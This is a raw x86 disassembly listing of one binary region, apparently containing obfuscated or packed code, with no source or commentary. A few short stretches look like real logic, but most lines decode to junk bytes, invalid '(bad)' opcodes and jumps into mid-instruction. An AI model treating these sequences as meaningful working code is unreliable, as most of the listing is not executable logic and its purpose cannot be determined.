  40c045:	mov    ecx,esi
  40c047:	pop    eax
  40c048:	dec    ebp
  40c049:	cmc    
  40c04a:	adc    eax,0x7d6eeaf5
  40c04f:	jecxz  0x40c018
  40c051:	mov    ebp,0x2f824ecd
  40c056:	add    al,0x11
  40c058:	aas    
  40c059:	in     al,dx
  40c05a:	pusha  
  40c05b:	bound  ecx,QWORD PTR [ecx]
  40c05d:	lods   al,BYTE PTR ds:[esi]
  40c05e:	test   BYTE PTR [ebx+0x4b],dl
  40c061:	push   es
  40c062:	sahf   
  40c063:	fwait
  40c064:	pop    ecx
  40c065:	push   edi
  40c066:	rol    BYTE PTR ds:0x141d640,cl
  40c06c:	shr    DWORD PTR [ecx],cl
  40c06e:	loop   0x40c054
  40c070:	add    al,0x10
  40c072:	mov    al,0x25
  40c074:	int    0x7a
  40c076:	test   eax,0xdff71345
  40c07b:	jnp    0x40c015
  40c07d:	cmp    ecx,DWORD PTR [eax]
  40c07f:	les    esi,FWORD PTR [ebp-0x47]
  40c082:	pop    ecx
  40c083:	or     BYTE PTR [ecx+0x7],dl
  40c086:	xor    edx,edx
  40c088:	xor    edi,ecx
  40c08a:	mov    esi,0x32729f
  40c08f:	add    edi,esi
  40c091:	div    edi
  40c093:	mov    edx,DWORD PTR [ebp-0x4]
  40c096:	xor    edx,ecx
  40c098:	lea    eax,[edx+eax*1+0x32729f]
  40c09f:	mov    edx,DWORD PTR [ebp+0x8]
  40c0a2:	mov    edi,DWORD PTR [ebp-0x24]
  40c0a5:	mov    DWORD PTR [edi+edx*4],eax
  40c0a8:	mov    eax,DWORD PTR [ebp-0x18]
  40c0ab:	mov    edx,DWORD PTR [ebp+0x8]
  40c0ae:	xor    eax,ecx
  40c0b0:	lea    eax,[eax+edx*1+0x32729f]
  40c0b7:	mov    DWORD PTR [ebp+0x8],eax
  40c0ba:	mov    eax,DWORD PTR [ebp-0x18]
  40c0bd:	mov    edx,DWORD PTR [ebp+0x14]
  40c0c0:	xor    eax,ecx
  40c0c2:	add    eax,esi
  40c0c4:	imul   eax,DWORD PTR [edx]
  40c0c7:	mov    edx,DWORD PTR [ebp-0x4]
  40c0ca:	xor    edx,ecx
  40c0cc:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0cf:	jmp    0x40c1b4
  40c0d4:	mov    ebx,0x61b1c335
  40c0d9:	pop    ecx
  40c0da:	mov    ecx,0x5c6a2de5
  40c0df:	xchg   edi,eax
  40c0e0:	das    
  40c0e1:	mov    ss,ecx
  40c0e3:	jmp    0x40c0c6
  40c0e5:	xor    eax,0x7eb67e7e
  40c0ea:	jle    0x40c16a
  40c0ec:	stos   DWORD PTR es:[edi],eax
  40c0ed:	mov    ch,0x35
  40c0ef:	pop    esp
  40c0f0:	adc    al,0x4b
  40c0f2:	and    DWORD PTR [edi+0x2d],0xffffff88
  40c0f6:	mov    ecx,0x3abb379
  40c0fb:	je     0x40c0a5
  40c0fd:	sub    cl,BYTE PTR [edx-0x285ec49a]
  40c103:	sbb    eax,0xf0e564fc
  40c108:	push   edx
  40c109:	cld    
  40c10a:	out    dx,eax
  40c10b:	ret    
  40c10c:	in     al,dx
  40c10d:	add    eax,0x960ce68c
  40c112:	outs   dx,BYTE PTR ds:[esi]
  40c113:	les    esp,FWORD PTR [ecx-0x42]
  40c116:	fsubr  DWORD PTR [esi+esi*8]
  40c119:	sub    esp,DWORD PTR [eax+0x16fdd935]
  40c11f:	inc    edx
  40c120:	test   BYTE PTR [ecx+0x6fec4214],al
  40c126:	out    dx,al
  40c127:	mov    ebx,0x617539f6
  40c12c:	lea    esp,[edx+eax*4-0x6c]
  40c130:	in     eax,dx
  40c131:	push   ss
  40c132:	adc    dl,cl
  40c134:	pcmpeqb mm3,QWORD PTR [ecx]
  40c137:	(bad)  [esi+0xa05f172]
  40c13d:	out    0xd,eax
  40c13f:	jbe    0x40c154
  40c141:	sub    al,0xd8
  40c143:	pop    ebp
  40c144:	and    DWORD PTR [esp+esi*2],esp
  40c147:	aas    
  40c148:	and    DWORD PTR [eax],ecx
  40c14a:	out    0xa6,al
  40c14c:	popf   
  40c14d:	inc    esi
  40c14e:	test   cl,dh
  40c150:	add    DWORD PTR [edi+0x3cde050b],ebp
  40c156:	push   esp
  40c157:	jmp    0x40c1a2
  40c159:	shr    BYTE PTR [ebx-0x1b],cl
  40c15c:	jge    0x40c13d
  40c15e:	jo     0x40c141
  40c160:	inc    edi
  40c161:	add    bh,BYTE PTR [edi+0x20]
  40c164:	sbb    eax,edx
  40c166:	mov    ecx,0x83e6ac28
  40c16b:	jp     0x40c0f3
  40c16d:	mov    ebx,0xdb2e3a10
  40c172:	ja     0x40c189
  40c174:	cld    
  40c175:	bnd jl 0x40c1af
  40c178:	mov    edx,0xafd03c47
  40c17d:	outs   dx,BYTE PTR ds:[esi]
  40c17e:	test   eax,0x73c60e06
  40c183:	enter  0xda1b,0xd0
  40c187:	ins    BYTE PTR es:[edi],dx
  40c188:	xchg   esi,eax
  40c189:	lahf   
  40c18a:	retf   
  40c18b:	in     al,0x74
  40c18d:	dec    esi
  40c18e:	sbb    ebx,DWORD PTR [eax]
  40c190:	adc    DWORD PTR [eax+0x3dcde8cd],eax
  40c196:	pop    eax
  40c197:	aas    
  40c198:	or     eax,eax
  40c19a:	mov    esp,0x92a534d1
  40c19f:	scas   al,BYTE PTR es:[edi]
  40c1a0:	xor    edi,DWORD PTR [esi]
  40c1a2:	call   0x4c9b:0xa1bb3430
  40c1a9:	add    al,0x30
  40c1ab:	shr    DWORD PTR [ebx],0xce
  40c1ae:	lods   al,BYTE PTR ds:[esi]
  40c1af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1b0:	xchg   edi,eax
  40c1b1:	dec    ecx
  40c1b2:	shl    BYTE PTR [ecx*4+0x729f0a8c],cl
  40c1b9:	xor    al,BYTE PTR [eax]
  40c1bb:	cmp    ecx,eax
  40c1bd:	jne    0x40bf8f
  40c1c3:	mov    ebx,esi
  40c1c5:	jmp    0x40c2b4
  40c1ca:	mov    ebx,0x32729f
  40c1cf:	jmp    0x40c2b4
  40c1d4:	mov    al,0x75
  40c1d6:	or     eax,0x598459f4
  40c1db:	leave  
  40c1dc:	jns    0x40c1f9
  40c1de:	or     ah,BYTE PTR [ecx-0x13a71b9a]
  40c1e4:	cmp    edx,ecx
  40c1e6:	jle    0x40c266
  40c1e8:	mov    dh,0x7e
  40c1ea:	jle    0x40c26a
  40c1ec:	aam    0xa1
  40c1ee:	push   eax
  40c1ef:	jmp    0x40c226
  40c1f1:	aaa    
  40c1f2:	push   esp
  40c1f3:	pop    esi
  40c1f4:	lds    esi,FWORD PTR [eax]
  40c1f6:	stos   DWORD PTR es:[edi],eax
  40c1f7:	imul   BYTE PTR [edi-0x13]
  40c1fa:	xor    BYTE PTR [edi-0x60],0xc6
  40c1fe:	retf   
  40c1ff:	or     BYTE PTR [ebx-0x38b9588c],ah
  40c205:	dec    esp
  40c206:	sbb    ch,al
  40c208:	xor    esi,DWORD PTR [edi*4+0x21b5a1ea]
  40c20f:	call   DWORD PTR [ebx-0x73bcbacb]
  40c215:	jb     0x40c260
  40c217:	cli    
  40c218:	jmp    0x40c20e
  40c21a:	xor    al,0xdf
  40c21c:	clc    
  40c21d:	add    al,0xfe
  40c21f:	js     0x40c21b
  40c221:	mov    al,0xd1
  40c223:	call   0x5ab68dd0
  40c228:	xchg   DWORD PTR ds:0xfe383bc4,eax
  40c22e:	sbb    eax,0x780b0c40
  40c233:	lods   eax,DWORD PTR ds:[esi]
  40c234:	push   ss
  40c235:	mov    ebp,0xb203a937
  40c23a:	add    eax,0xc999e4b9
  40c23f:	inc    ebx
  40c240:	mov    eax,0xd8846dd7
  40c245:	add    ch,BYTE PTR [ecx+0x12]
  40c248:	mov    edi,0x4067dd56
  40c24d:	sub    BYTE PTR ds:0x7fadf766,dh
  40c253:	aaa    
  40c254:	push   eax
  40c255:	mov    al,BYTE PTR [edi+0x484581ad]
  40c25b:	fistp  DWORD PTR ds:[edi-0x7a7a4303]
  40c262:	pop    ebx
  40c263:	xchg   ebx,eax
  40c264:	jecxz  0x40c2e3
  40c266:	pop    ds
  40c267:	fmul   QWORD PTR [esi]
  40c269:	push   0xffffffae
  40c26b:	lods   eax,DWORD PTR ds:[esi]
  40c26c:	sti    
  40c26d:	mov    eax,0xb6fb4dfc
  40c272:	fwait
  40c273:	in     al,0xf3
  40c275:	(bad)  
  40c276:	pop    esp
  40c277:	into   
  40c278:	fstp   DWORD PTR [ecx-0x45]
  40c27b:	mov    esi,0x180c3277
  40c280:	xchg   ebp,eax
  40c281:	pushf  
  40c282:	cmp    cl,cl
  40c284:	das    
  40c285:	stc    
  40c286:	add    BYTE PTR [edi],bh
  40c288:	(bad)  
  40c289:	push   esi
  40c28a:	or     al,0x7a
  40c28c:	inc    ebp
  40c28d:	test   eax,0x45f5d5de
  40c292:	int    0x67
  40c294:	into   
  40c295:	pushf  
  40c296:	or     ah,BYTE PTR [ecx*1+0x71a390c0]
  40c29d:	stos   BYTE PTR es:[edi],al
  40c29e:	iret   
  40c29f:	xchg   ebx,eax
  40c2a0:	ss test eax,0xf54b5cfc
  40c2a6:	test   BYTE PTR [edi+0x14],ch
  40c2a9:	(bad)
  40c2ac:	push   ss
  40c2ad:	stc    
  40c2ae:	sbb    esp,DWORD PTR [ecx]
  40c2b0:	mov    ds:0x8b05ead4,eax
  40c2b5:	inc    ebp
  40c2b6:	cld    
  40c2b7:	xor    eax,0x7510859
  40c2bc:	add    eax,ebx
  40c2be:	mov    DWORD PTR [ebp-0xc],eax
  40c2c1:	xor    ebx,ebx
  40c2c3:	lea    eax,[ebp-0x10]
  40c2c6:	add    ebx,DWORD PTR [eax]
  40c2c8:	jmp    0x40c3ad
  40c2cd:	sbb    al,0xbe
  40c2cf:	cmp    al,0xc2
  40c2d1:	pop    esp
  40c2d2:	inc    eax
  40c2d3:	and    BYTE PTR [eax+0x3b],ah
  40c2d6:	gs xchg edx,ebp
  40c2d9:	repnz into 
  40c2db:	jno    0x40c278
  40c2dd:	jno    0x40c2aa
  40c2df:	jle    0x40c35f
  40c2e1:	mov    dh,0x7e
  40c2e3:	jle    0x40c363
  40c2e5:	jmp    0x40c322
  40c2e7:	mov    eax,0xf967c263
  40c2ec:	stc    
  40c2ed:	jecxz  0x40c321
  40c2ef:	stc    
  40c2f0:	test   BYTE PTR [ecx+esi*4+0x37ed6389],dh
  40c2f7:	sbb    DWORD PTR [edx+0x75],esp
  40c2fa:	add    al,0x8e
  40c2fc:	mov    DWORD PTR [esp+edx*4],ebp
  40c2ff:	loop   0x40c37b
  40c301:	icebp  
  40c302:	inc    edx
  40c303:	push   ebx
  40c304:	push   0x2c55eb9e
  40c309:	jge    0x40c2a0
  40c30b:	lods   al,BYTE PTR ds:[esi]
  40c30c:	xchg   esi,eax
  40c30d:	jne    0x40c322
  40c30f:	into   
  40c310:	sbb    BYTE PTR [edi-0x144faeb4],dl
  40c316:	and    al,0xc6
  40c318:	pushf  
  40c319:	(bad)  
  40c31a:	jecxz  0x40c30c
  40c31c:	add    DWORD PTR [eax],ebx
  40c31e:	mov    ch,0x33
  40c320:	inc    esp
  40c321:	xor    eax,0x333d6bb
  40c326:	adc    al,0x83
  40c328:	sar    DWORD PTR [ecx-0xa930f31],cl
  40c32e:	aas    
  40c32f:	mov    ah,0x34
  40c331:	adc    eax,0xc7d0130a
  40c336:	mov    edx,0x3fe3c196
  40c33b:	inc    ebx
  40c33c:	(bad)  
  40c33d:	dec    esi
  40c33e:	mov    ah,0xbb
  40c340:	jmp    DWORD PTR [eax+0x15]
  40c343:	cmp    eax,DWORD PTR [eax-0x1c0c727e]
  40c349:	jo     0x40c3ba
  40c34b:	mov    ah,0x5a
  40c34d:	cmp    ah,dl
  40c34f:	je     0x40c2ea
  40c351:	pop    esp
  40c352:	xlat   BYTE PTR ds:[ebx]
  40c353:	ret    
  40c354:	rcr    BYTE PTR [esi],0x63
  40c357:	aad    0x85
  40c359:	jno    0x40c349
  40c35b:	je     0x40c3b7
  40c35d:	aas    
  40c35e:	imul   esi,DWORD PTR [esi],0x5
  40c361:	cmp    esi,ebx
  40c363:	pop    edi
  40c364:	inc    BYTE PTR [esi+0x1f7d4b93]
  40c36a:	stos   BYTE PTR es:[edi],al
  40c36b:	mov    al,0x65
  40c36d:	jmp    0x40c376
  40c36f:	aas    
  40c370:	push   eax
  40c371:	add    dl,BYTE PTR [esp+esi*2+0x4d0dc797]
  40c378:	iret   
  40c379:	mov    ah,0x76
  40c37b:	add    eax,0x4942bdef
  40c380:	push   esp
  40c381:	hlt    
  40c382:	mov    dl,0x4e
  40c384:	div    DWORD PTR [edx+0x6f6362b7]
  40c38a:	inc    esi
  40c38b:	test   DWORD PTR [ecx-0x2],ebp
  40c38e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c38f:	mov    eax,0x1d1968f9
  40c394:	div    BYTE PTR [di-0x2]
  40c398:	adc    DWORD PTR [ecx+0x2bd85054],ebp
  40c39e:	mov    cl,0x78
  40c3a0:	mov    al,BYTE PTR [ebx]
  40c3a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3a3:	int    0xd6
  40c3a5:	sub    bh,ch
  40c3a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3a8:	push   ebx
  40c3a9:	xchg   ebp,eax
  40c3aa:	ret    
  40c3ab:	fdivrp st(4),st
  40c3ad:	call   ebx
  40c3af:	xor    ebx,ebx
  40c3b1:	jmp    0x40c496
  40c3b6:	popa   
  40c3b7:	jno    0x40c409
  40c3b9:	jnp    0x40c41b
  40c3bb:	jnp    0x40c436
  40c3bd:	or     DWORD PTR ds:0xd52e5fee,ecx
  40c3c3:	cli    
  40c3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3c5:	ss dec ecx
  40c3c7:	retf   
  40c3c8:	jle    0x40c448
  40c3ca:	mov    dh,0x7e
  40c3cc:	jle    0x40c44c
  40c3ce:	and    DWORD PTR [edi+0x4e],0x82b61a14
  40c3d5:	mov    ebx,0x100ecc6f
  40c3da:	rcl    bh,cl
  40c3dc:	sbb    DWORD PTR [eax-0x1abb8041],esp
  40c3e2:	sahf   
  40c3e3:	ins    BYTE PTR es:[edi],dx
  40c3e4:	daa    
  40c3e5:	mov    ch,0xa4
  40c3e7:	loope  0x40c36e
  40c3e9:	mov    ch,0xe9
  40c3eb:	jns    0x40c40b
  40c3ed:	add    ecx,DWORD PTR [ebp+0x2015e724]
  40c3f3:	mov    edx,0xc0a27f83
  40c3f8:	leave  
  40c3f9:	mov    al,0xfb
  40c3fb:	xor    al,0xc9
  40c3fd:	ins    BYTE PTR es:[edi],dx
  40c3fe:	mov    eax,ds:0xc8282823
  40c403:	ins    DWORD PTR es:[edi],dx
  40c404:	loop   0x40c3a6
  40c406:	dec    eax
  40c407:	xor    eax,0x9bc9220d
  40c40c:	xor    edx,DWORD PTR [esi+0x52]
  40c40f:	fwait
  40c410:	mov    ebp,0xc67bc6d5
  40c415:	mov    al,0x28
  40c417:	dec    edx
  40c418:	sti    
  40c419:	add    DWORD PTR [edi+0x74],ecx
  40c41c:	dec    bx
  40c41e:	clc    
  40c41f:	ja     0x40c3bd
  40c421:	das    
  40c422:	xor    al,0x4c
  40c424:	or     bh,BYTE PTR [ecx]
  40c426:	mov    bl,0x29
  40c428:	loope  0x40c466
  40c42a:	popa   
  40c42b:	jg     0x40c425
  40c42d:	and    DWORD PTR [edx-0x5dead2dc],edx
  40c433:	aaa    
  40c434:	xchg   edx,eax
  40c435:	push   ebx
  40c436:	pushf  
  40c437:	repnz mov dl,0xc4
  40c43a:	xor    al,0x23
  40c43c:	nop
  40c43d:	fistp  DWORD PTR [edx]
  40c43f:	cwde   
  40c440:	xchg   edi,eax
  40c441:	loopne 0x40c40d
  40c443:	mov    ch,0xab
  40c445:	sahf   
  40c446:	mov    cl,0x47
  40c448:	xor    edi,esp
  40c44a:	sbb    al,0x83
  40c44c:	jb     0x40c3f7
  40c44e:	in     eax,0x0
  40c450:	xchg   edi,eax
  40c451:	out    dx,eax
  40c452:	mov    dl,0x69
  40c454:	jbe    0x40c460
  40c456:	or     eax,0x424e5525
  40c45b:	jp     0x40c46c
  40c45d:	int    0xaa
  40c45f:	and    edi,DWORD PTR [ecx]
  40c461:	sub    eax,0x839cd911
  40c466:	push   ss
  40c467:	ds mov esp,0xda73152
  40c46d:	cmp    al,0xa9
  40c46f:	push   edi
  40c470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c471:	loop   0x40c499
  40c473:	mul    BYTE PTR [ebx-0x25c0f9eb]
  40c479:	fs repnz ins DWORD PTR es:[edi],dx
  40c47c:	js     0x40c4e4
  40c47e:	(bad)  
  40c47f:	leave  
  40c480:	loop   0x40c440
  40c482:	mov    es,WORD PTR [edx-0x53]
  40c485:	lock mov cl,0x5e
  40c488:	sub    esp,esp
  40c48a:	xchg   edx,eax
  40c48b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c48c:	or     al,0x85
  40c48e:	dec    edi
  40c48f:	xchg   ebp,eax
  40c490:	sub    WORD PTR [eax],bx
  40c493:	outs   dx,DWORD PTR ds:[esi]
  40c494:	sbb    bl,0x43
  40c497:	cmp    DWORD PTR [ebp+0x10],ebx
  40c49a:	jmp    0x40c57f
  40c49f:	test   al,0xfc
  40c4a1:	xchg   esi,eax
  40c4a2:	push   esi
  40c4a3:	stos   BYTE PTR es:[edi],al
  40c4a4:	push   esp
  40c4a5:	push   0xe4b270b0
  40c4aa:	gs mov esp,0x814a8ccb
  40c4b0:	enter  0x7e7e,0xb6
  40c4b4:	jle    0x40c534
  40c4b6:	jle    0x40c447
  40c4b8:	mul    DWORD PTR [edi+0x75]
  40c4bb:	arpl   WORD PTR [edx-0x6afcca37],si
  40c4c1:	popa   
  40c4c2:	in     eax,dx
  40c4c3:	push   ds
  40c4c4:	mov    eax,ds:0xfb9adadc
  40c4c9:	sahf   
  40c4ca:	addr16 xchg esi,eax
  40c4cc:	sub    al,BYTE PTR [ebp+0x173b4316]
  40c4d2:	xchg   edx,eax
  40c4d3:	add    edi,eax
  40c4d5:	pop    esp
  40c4d6:	cli    
  40c4d7:	sti    
  40c4d8:	add    ebp,edi
  40c4da:	sbb    al,0xf3
  40c4dc:	inc    BYTE PTR [esi]
  40c4de:	shl    DWORD PTR [edx-0x44434c0b],cl
  40c4e4:	scas   eax,DWORD PTR es:[edi]
  40c4e5:	pop    ds
  40c4e6:	push   ebx
  40c4e7:	mov    esp,0x86f51d77
  40c4ec:	cdq    
  40c4ed:	(bad)  
  40c4ee:	ins    DWORD PTR es:[edi],dx
  40c4ef:	mov    DWORD PTR [esi],esp
  40c4f1:	or     eax,0x56d4379c
  40c4f6:	and    eax,0x6282e4b2
  40c4fb:	and    eax,0xd10de45f
  40c500:	adc    ah,bh
  40c502:	sbb    BYTE PTR [eax+eax*4],dh
  40c505:	pop    edi
  40c506:	mov    edx,0x921cd6cf
  40c50b:	test   al,bl
  40c50d:	ds popa 
  40c50f:	test   bl,cl
  40c511:	add    ebp,DWORD PTR [ebx-0x10]
  40c514:	mov    al,0xf9
  40c516:	sub    ebx,DWORD PTR [esi+edx*1-0x69]
  40c51a:	test   al,0xff
  40c51c:	mov    esi,0x2317e8cc
  40c521:	jle    0x40c539
  40c523:	(bad)  
  40c524:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40c526:	jae    0x40c575
  40c528:	jo     0x40c5a9
  40c52a:	out    0xcc,eax
  40c52c:	ins    DWORD PTR es:[edi],dx
  40c52d:	dec    edi
  40c52e:	pushf  
  40c52f:	jl     0x40c4b1
  40c531:	lock or eax,edx
  40c534:	les    esi,FWORD PTR [edi+0x3a]
  40c537:	push   ecx
  40c538:	clc    
  40c539:	mov    al,ds:0xc4043bd6
  40c53e:	pop    esp
  40c53f:	xchg   ebx,eax
  40c540:	rcr    DWORD PTR [esi],0x4a
  40c543:	jmp    DWORD PTR [ecx]
  40c545:	or     DWORD PTR [ebx-0x74],ecx
  40c548:	cmp    bh,ch
  40c54a:	xor    eax,0x3138055a
  40c54f:	xchg   ebp,ecx
  40c551:	fcmovu st,st(6)
  40c553:	aad    0x7
  40c555:	(bad)  
  40c557:	xchg   edx,eax
  40c558:	retf   
  40c559:	xchg   edx,eax
  40c55a:	mov    edx,0x9d86da0f
  40c55f:	out    0x3b,al
  40c561:	fs add eax,0xd1a1a7d4
  40c567:	inc    esi
  40c568:	dec    ebx
  40c569:	xor    BYTE PTR [eax],al
  40c56b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c56c:	lods   al,BYTE PTR ds:[esi]
  40c56d:	mov    WORD PTR [edi+0x395ea3ce],fs
  40c573:	(bad)  
  40c575:	pusha  
  40c576:	mov    ecx,0xbd69abad
  40c57b:	lds    edi,FWORD PTR [ecx+0x58]
  40c57e:	jg     0x40c58f
  40c580:	test   ch,bh
  40c582:	add    BYTE PTR [eax],al
  40c584:	add    BYTE PTR [edx+0x6a590a6a],dl
  40c58a:	add    al,0x5b
  40c58c:	inc    ebx
  40c58d:	xchg   ebx,ecx
  40c58f:	sub    ebx,ecx
  40c591:	xchg   ebx,ecx
  40c593:	jmp    0x40c678
  40c598:	xchg   DWORD PTR [eax+0x3d],ebx
  40c59b:	out    0x31,al
  40c59d:	jnp    0x40c544
  40c59f:	jns    0x40c5e7
  40c5a1:	add    al,0x4b
  40c5a3:	call   0x89f17d12
  40c5a8:	fxch   st(1)
  40c5aa:	jle    0x40c62a
  40c5ac:	mov    dh,0x7e
  40c5ae:	jle    0x40c62e
  40c5b0:	jle    0x40c538
  40c5b2:	and    ebp,esi
  40c5b4:	jbe    0x40c629
  40c5b6:	pop    es
  40c5b7:	xchg   ecx,eax
  40c5b8:	sub    al,0xb1
  40c5ba:	jge    0x40c55f
  40c5bc:	cmp    ebp,eax
  40c5be:	icebp  
  40c5bf:	jge    0x40c5bb
  40c5c1:	jge    0x40c5ac
  40c5c3:	jb     0x40c61c
  40c5c5:	mov    ah,0xc2
  40c5c7:	mov    bl,0xef
  40c5c9:	mov    ds:0xc8fc78bd,eax
  40c5ce:	fnsave [edx+0x76ba86f5]
  40c5d4:	jg     0x40c647
  40c5d6:	push   ebp
  40c5d7:	mov    eax,ds:0x1f6d46d
  40c5dc:	mov    WORD PTR [eax-0xb],fs
  40c5df:	mov    esi,DWORD PTR [esi]
  40c5e1:	fistp  DWORD PTR [esi-0x37ec01d2]
  40c5e7:	inc    esi
  40c5e8:	xchg   bh,cl
  40c5ea:	fs (bad) 
  40c5ed:	jno    0x40c5f7
  40c5ef:	xchg   esi,eax
  40c5f0:	test   eax,0xb06e9243
  40c5f5:	cmp    DWORD PTR [ecx-0xe],0x9a70d0db
  40c5fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5fd:	rcr    dh,0xcb
  40c600:	repnz and bh,BYTE PTR [eax]
  40c603:	jmp    0xc3ff:0xf123b5dc
  40c60a:	xchg   ecx,eax
  40c60b:	xor    BYTE PTR [edi],dl
  40c60d:	mov    dh,0xef
  40c60f:	test   DWORD PTR [esi],esp
  40c611:	dec    eax
  40c612:	jne    0x40c5f1
  40c614:	jecxz  0x40c657
  40c616:	test   eax,0xec217ce3
  40c61b:	xchg   esi,eax
  40c61c:	mov    es:0xd43fd8bf,eax
  40c622:	out    dx,al
  40c623:	pusha  
  40c624:	xlat   BYTE PTR ds:[ebx]
  40c625:	sar    BYTE PTR [esi+edi*1-0x2f],cl
  40c629:	jecxz  0x40c5b2
  40c62b:	add    BYTE PTR [esp+ebp*2+0x35],bh
  40c62f:	mov    ecx,0xf5147162
  40c634:	or     ebp,edx
  40c636:	loopne 0x40c69c
  40c638:	add    al,0xbb
  40c63a:	add    al,0xf3
  40c63c:	mov    edx,0xa2067710
  40c641:	arpl   WORD PTR [ecx+0x6039c0ac],cx
  40c647:	mov    ah,BYTE PTR [edi+0x37a849ff]
  40c64d:	pop    eax
  40c64e:	fadd   st(1),st
  40c650:	push   cs
  40c651:	jecxz  0x40c697
  40c653:	jnp    0x40c684
  40c655:	std    
  40c656:	jbe    0x40c6a9
  40c658:	xchg   ax,ax
  40c65a:	cs cdq 
  40c65c:	mov    edx,0xdd9ffc80
  40c661:	cmp    BYTE PTR [edx-0x24],al
  40c664:	stos   DWORD PTR es:[edi],eax
  40c665:	add    edx,edx
  40c667:	lods   al,BYTE PTR ds:[esi]
  40c668:	and    ecx,esp
  40c66a:	adc    edi,DWORD PTR [ecx+0x54e17d40]
  40c670:	xchg   ebx,eax
  40c671:	inc    ebx
  40c672:	(bad)  
  40c673:	je     0x40c678
  40c675:	jmp    0x40c6bc
  40c677:	cmp    al,0x49
  40c679:	mov    eax,DWORD PTR [ebp-0x1c]
  40c67c:	imul   eax,ecx
  40c67f:	add    esp,eax
  40c681:	xchg   edx,eax
  40c682:	push   eax
  40c683:	xor    ebx,ebx
  40c685:	mov    edx,esp
  40c687:	dec    edx
  40c688:	inc    ebx
  40c689:	add    ebx,DWORD PTR [edx+ebx*1]
  40c68c:	dec    ebx
  40c68d:	xor    edx,edx
  40c68f:	add    DWORD PTR [ebp-0xc],ebx
  40c692:	pop    ebx
  40c693:	mov    eax,DWORD PTR [ebp-0xc]
  40c696:	pop    edi
  40c697:	pop    esi
  40c698:	pop    ebx
  40c699:	leave  
  40c69a:	ret    0x10
